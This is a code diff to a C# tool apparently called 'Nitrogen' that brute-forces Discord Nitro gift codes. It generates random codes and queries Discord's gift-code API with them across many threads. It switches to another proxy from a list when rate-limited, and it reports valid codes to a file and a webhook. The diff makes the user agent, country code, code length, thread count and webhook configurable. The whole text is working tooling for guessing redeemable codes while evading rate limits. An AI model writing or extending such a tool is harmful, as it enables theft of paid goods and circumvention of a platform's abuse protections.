@@ -21,14 +21,14 @@ namespace Nitrogen
 
             while (true)
             {
-                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.42 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36 Yasakar/13.37";
+                request.UserAgent = Settings.Default.UserAgent;
                 request.Proxy = ProxyQueue.NextProxy();
                 if (request.Proxy != null)
                     request.Proxy.ConnectTimeout = int.MaxValue;
                 hits++;
                 try
                 {
-                    HttpResponse httpResponse = request.Get($"https://discord.com/api/v9/entitlements/gift-codes/{code}?country_code=BY&with_application=true&with_subscription_plan=true");
+                    HttpResponse httpResponse = request.Get($"https://discord.com/api/v9/entitlements/gift-codes/{code}?country_code={Settings.Default.CountryCode}&with_application=true&with_subscription_plan=true");
                     string response = httpResponse.ToString();
                     if (response.ToLower().Contains("rate limited")) // There is a rate limit, use another proxy.
                     {
@@ -39,7 +39,8 @@ namespace Nitrogen
                     {
                         @checked++; found++;
                         Console.WriteLine($"\u001b[92mFound   \u001b[96m{code} \u001b[37musing {(request.Proxy == null ? "no proxy" : $"proxy {request.Proxy} ({request.Proxy.Type})")}.");
-                        webhook.SendMessage($"https://discord.gift/{code}");
+                        if (Settings.Default.EnableWebhook) 
+                            webhook.SendMessage($"https://discord.gift/{code}");
                         UpdateTitle();
                         return true;
                     }
@@ -50,10 +51,11 @@ namespace Nitrogen
                         UpdateTitle();
                         return false;
                     }
-                    if (httpResponse.StatusCode == HttpStatusCode.OK) // We don't know whether this code is Nitro, but still want to save it as it returns status code 200.
+                    if (httpResponse.StatusCode == HttpStatusCode.OK && !Settings.Default.IgnoreSuccessfulRequestsWithoutNitro) // We don't know whether this code is Nitro, but still want to save it as it returns status code 200.
                     {
                         Console.WriteLine($"\u001b[92mFailed  \u001b[96m{code} \u001b[37musing {(request.Proxy == null ? "no proxy" : $"proxy {request.Proxy} ({request.Proxy.Type})")}.\n{response}");
-                        webhook.SendMessage($"Succeeded, but failed to process the request.\nResponse:\n```{response}```");
+                        if (Settings.Default.EnableWebhook) 
+                            webhook.SendMessage($"https://discord.gift/{code} \nSucceeded, but failed to process the request.\nResponse:\n```{response}```");
                         UpdateTitle();
                         return true;
                     }
@@ -72,7 +74,7 @@ namespace Nitrogen
             Thread.Sleep(random.Next(1000));
             while (true)
             {
-                string code = RandomString(24);
+                string code = RandomString(Settings.Default.CodeLength);
                 if (Check(code))
                     File.AppendAllText("results.txt", code + '\n');
             }
@@ -80,11 +82,15 @@ namespace Nitrogen
 
         public static void Main(string[] args)
         {
-            webhook = new Webhook("YOUR_DISCORD_WEBHOOK_URL") { Username = "Dungeon Master" };
-            webhook.SendMessage("Started up successfully!");
-            ThreadPool.SetMaxThreads(128, 128);
+            Settings.Default.Save();
+            if (Settings.Default.EnableWebhook)
+            {
+                webhook = new Webhook(Settings.Default.WebhookUrl) { Username = Settings.Default.WebhookName };
+                webhook.SendMessage("Started up successfully!");
+            }
+            ThreadPool.SetMaxThreads(Settings.Default.ThreadCount * 2, Settings.Default.ThreadCount);
             ProxyQueue.UpdateList(File.ReadAllLines("proxies.txt").ToList());
-            for (int i = 0; i < 32; i++)
+            for (int i = 0; i < Settings.Default.ThreadCount; i++)
                 new Thread(Work).Start();
             Console.ReadKey();
         }
